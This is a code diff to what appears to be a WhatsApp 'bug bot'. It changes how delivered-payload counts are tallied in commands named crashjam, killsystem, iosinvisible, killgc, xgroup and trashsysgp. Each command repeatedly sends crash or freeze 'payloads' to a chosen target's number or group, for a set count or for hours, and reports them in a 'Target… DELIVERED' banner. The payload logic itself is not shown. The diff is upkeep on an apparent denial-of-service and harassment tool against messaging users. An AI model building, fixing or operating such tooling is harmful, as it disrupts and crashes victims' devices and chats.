@@ -38,8 +38,8 @@ function notifySending(sock, chat, target, cmdName = 'BUG') {
 }
 
 async function notifyResult(sock, chat, target, cmdName, result, quotedMsg) {
-  if (result && result.success) {
-    const text = `┏━━━━━━〣 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ 📦 Status  : DELIVERED\n┃ 📬 Packets : ${result.deliveredCount || 1} delivered\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
+  if (result && result.success && result.deliveredCount > 0) {
+    const text = `┏━━━━━━〣 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ 📦 Status  : DELIVERED\n┃ 📬 Packets : ${result.deliveredCount} delivered\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
     return sock.sendMessage(chat, { text }, { quoted: quotedMsg });
   } else {
     const errReason = result?.errors?.[0] || 'Payload delivery rejected by target server/device';
@@ -84,7 +84,7 @@ export async function crashjamCommand(sock, chat, msg, args) {
       for (let i = 0; i < count; i++) {
         try {
           const res = await crashjamLogic.crashjam(sock, targetJid);
-          if (res?.success) totalDelivered += (res.deliveredCount || 1);
+          if (res?.success && res.deliveredCount > 0) totalDelivered += res.deliveredCount;
           else if (res?.errors) errors.push(...res.errors);
         } catch (e) {
           errors.push(e.message);
@@ -95,7 +95,7 @@ export async function crashjamCommand(sock, chat, msg, args) {
       const endTime = Date.now() + hours * 60 * 60 * 1000;
       try {
         const res = await crashjamLogic.crashjam(sock, targetJid);
-        if (res?.success) totalDelivered += (res.deliveredCount || 1);
+        if (res?.success && res.deliveredCount > 0) totalDelivered += res.deliveredCount;
         else if (res?.errors) errors.push(...res.errors);
       } catch (e) {
         errors.push(e.message);
@@ -139,7 +139,7 @@ export async function killsystemCommand(sock, chat, msg, args) {
       for (let i = 0; i < count; i++) {
         try {
           const res = await killsystemLogic.killsystem(sock, targetJid);
-          if (res?.success) totalDelivered += (res.deliveredCount || 1);
+          if (res?.success && res.deliveredCount > 0) totalDelivered += res.deliveredCount;
           else if (res?.errors) errors.push(...res.errors);
         } catch (e) {
           errors.push(e.message);
@@ -150,7 +150,7 @@ export async function killsystemCommand(sock, chat, msg, args) {
       const endTime = Date.now() + hours * 60 * 60 * 1000;
       try {
         const res = await killsystemLogic.killsystem(sock, targetJid);
-        if (res?.success) totalDelivered += (res.deliveredCount || 1);
+        if (res?.success && res.deliveredCount > 0) totalDelivered += res.deliveredCount;
         else if (res?.errors) errors.push(...res.errors);
       } catch (e) {
         errors.push(e.message);
@@ -306,7 +306,7 @@ export async function iosinvisibleCommand(sock, chat, msg, args) {
       for (let i = 0; i < count; i++) {
         try {
           const res = await IosLogic.IosInvisible(sock, targetJid);
-          if (res?.success) totalDelivered += (res.deliveredCount || 1);
+          if (res?.success && res.deliveredCount > 0) totalDelivered += res.deliveredCount;
           else if (res?.errors) errors.push(...res.errors);
         } catch (e) {
           errors.push(e.message);
@@ -317,7 +317,7 @@ export async function iosinvisibleCommand(sock, chat, msg, args) {
       const endTime = Date.now() + hours * 60 * 60 * 1000;
       try {
         const res = await IosLogic.IosInvisible(sock, targetJid);
-        if (res?.success) totalDelivered += (res.deliveredCount || 1);
+        if (res?.success && res.deliveredCount > 0) totalDelivered += res.deliveredCount;
         else if (res?.errors) errors.push(...res.errors);
       } catch (e) {
         errors.push(e.message);
@@ -358,7 +358,7 @@ export async function xgroupCommand(sock, chat, msg, args) {
     if (typeof XgcLogic.Xgc === 'function') {
       try {
         const res = await XgcLogic.Xgc(sock, targetJid);
-        if (res?.success) totalDelivered += (res.deliveredCount || 1);
+        if (res?.success && res.deliveredCount > 0) totalDelivered += res.deliveredCount;
         else if (res?.errors) errors.push(...res.errors);
       } catch (e) {
         errors.push(e.message);
@@ -402,7 +402,7 @@ export async function killgcCommand(sock, chat, msg, args) {
     if (typeof gcFrzLogic.gcFrz === 'function') {
       try {
         const res = await gcFrzLogic.gcFrz(sock, targetJid);
-        if (res?.success) totalDelivered += (res.deliveredCount || 1);
+        if (res?.success && res.deliveredCount > 0) totalDelivered += res.deliveredCount;
         else if (res?.errors) errors.push(...res.errors);
       } catch (e) {
         errors.push(e.message);
@@ -446,11 +446,11 @@ export async function trashsysgpCommand(sock, chat, msg, args) {
     try {
       if (typeof killsystemLogic.killsystem === 'function') {
         const r1 = await killsystemLogic.killsystem(sock, targetJid);
-        if (r1?.success) totalDelivered += (r1.deliveredCount || 1);
+        if (r1?.success && r1.deliveredCount > 0) totalDelivered += r1.deliveredCount;
       }
       if (typeof gcFrzLogic.gcFrz === 'function') {
         const r2 = await gcFrzLogic.gcFrz(sock, targetJid);
-        if (r2?.success) totalDelivered += (r2.deliveredCount || 1);
+        if (r2?.success && r2.deliveredCount > 0) totalDelivered += r2.deliveredCount;
       }
     } catch (e) {
       errors.push(e.message);
@@ -498,7 +498,7 @@ export async function testCommand(sock, chat, msg, args) {
     for (let i = 0; i < count; i++) {
       try {
         const res = await testlogic.test(sock, targetJid);
-        if (res?.success) totalDelivered += (res.deliveredCount || 1);
+        if (res?.success && res.deliveredCount > 0) totalDelivered += res.deliveredCount;
         else if (res?.errors) errors.push(...res.errors);
       } catch (e) {
         errors.push(e.message);
